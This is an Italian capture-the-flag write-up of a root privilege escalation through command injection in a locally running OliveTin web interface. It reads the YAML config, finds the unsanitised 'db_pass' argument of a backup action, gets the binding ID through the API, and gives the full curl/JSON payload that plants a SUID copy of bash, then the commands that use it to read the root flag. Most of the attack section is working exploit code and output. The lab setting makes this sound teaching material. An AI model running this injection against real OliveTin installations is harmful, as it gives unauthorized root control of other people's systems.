**Cos'è OliveTin.** È un'interfaccia web che espone **comandi shell predefiniti come pulsanti cliccabili** — nasce per dare a utenti non tecnici un modo sicuro di lanciare azioni fisse (riavviare un servizio, fare un backup, ecc.). Gira come **root** (l'abbiamo appena visto nei processi) e ascolta su `127.0.0.1:1337`. Questo è, con altissima probabilità, la via a root: se uno dei comandi configurati è manipolabile — tipicamente via **command injection** attraverso un argomento che l'utente può passare — l'iniezione viene eseguita nel contesto root del processo OliveTin.

Cerchiamo riferimenti a **OliveTin**:

`find / -iname 'olivetin' 2>/dev/null`

Troviamo:
```
find / -iname 'olivetin' 2>/dev/null
/var/www/olivetin
/etc/OliveTin
```

OliveTin è guidato da un file YAML (`config.yaml`) che definisce ogni azione con lo `shell` command associato e i suoi `arguments`. Vale la pena leggerlo: rivela i comandi esatti e — soprattutto — quali argomenti accettano input, cioè dove iniettare. Cerchiamolo con:

``` bash
find / -iname 'config.yaml' 2>/dev/null | grep -i olivetin
# troviamo: /etc/OliveTin/config.yaml
```

Quindi:
File dell'applicazione in `/var/www/olivetin/` e configurazione in `/etc/OliveTin/config.yaml`.
### Analisi della configurazione OliveTin

```bash
cat /etc/OliveTin/config.yaml
```

OliveTin è una web UI che esegue comandi shell predefiniti ("actions") come root. La configurazione rivela:

- **Nessuna autenticazione:** `authRequireGuestsToLogin: false` con `defaultPermissions: { exec: true }` — chiunque può eseguire le action senza login.
- **Action vulnerabile:**

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier    # filtrato: solo [a-zA-Z0-9._-]
    - name: db_pass
      type: password            # permissivo: accetta caratteri speciali
    - name: db_name
      type: ascii_identifier    # filtrato
```

Il campo `db_pass` è di tipo `password` (non sanitizzato) e viene interpolato direttamente nella stringa passata a `sh -c`. Classic command injection.
### Analisi dell'API REST

OliveTin espone un'API connect/protobuf su `http://127.0.0.1:1337`. Raggiungibile direttamente dalla shell `haris` senza forward.

**Verifica del servizio:**

```bash
curl -s http://127.0.0.1:1337/ | head
# → risponde HTML: OliveTin è attivo
```

**Scoperta degli endpoint** leggendo il JS del frontend da disco:

```bash
grep -roiE 'client\.[a-zA-Z]+' /var/www/olivetin/assets/ | sort -u
```

Metodi rilevanti: `getDashboard`, `startAction`, `getActionBinding`.

**Formato della richiesta** estratto da `ActionDetailsView-DHIcWcGw.js`:

```js
const e = { bindingId: o.value.bindingId, arguments: [] }
await window.client.startAction(e)
```

Il campo chiave è **`bindingId`**.

**Recupero del bindingId** di Backup Database:

```bash
curl -s -X POST http://127.0.0.1:1337/api/GetDashboard \
  -H 'Content-Type: application/json' -d '{}'
```

Dal JSON di risposta:

```json
{
  "title": "Backup Database",
  "action": {
    "bindingId": "backup_database",
    ...
  }
}
```

Il `bindingId` coincide con l'`id:` dichiarato nel config (OliveTin usa il valore statico quando `id:` è esplicitato, UUID random altrimenti).
### Exploit: Command Injection in db_pass

**Payload:** l'apice singolo chiude la stringa `-p'...'`, poi vengono concatenati i comandi arbitrari, e `echo '` riapre l'apice per evitare errori di parsing nella parte restante della riga.

Stringa `shell` risultante eseguita da root:

```
mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; echo '' production > /opt/backups/backup.sql
```

**Esecuzione:**

```bash
cat > /tmp/p.json <<'EOF'
{
  "bindingId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x'; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; echo '"},
    {"name": "db_name", "value": "production"}
  ]
}
EOF

curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H 'Content-Type: application/json' \
  --data @/tmp/p.json
```

Risposta: `executionTrackingId` → action eseguita con successo.
### Ottenere la shell root

```bash
ls -l /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash  ← la 's' conferma SUID

/tmp/rootbash -p
# il flag -p impedisce a bash di scartare l'euid privilegiato

whoami
# root

cat /root/root.txt
# <flag>
```
Abbiamo così ottenuto la flag root.
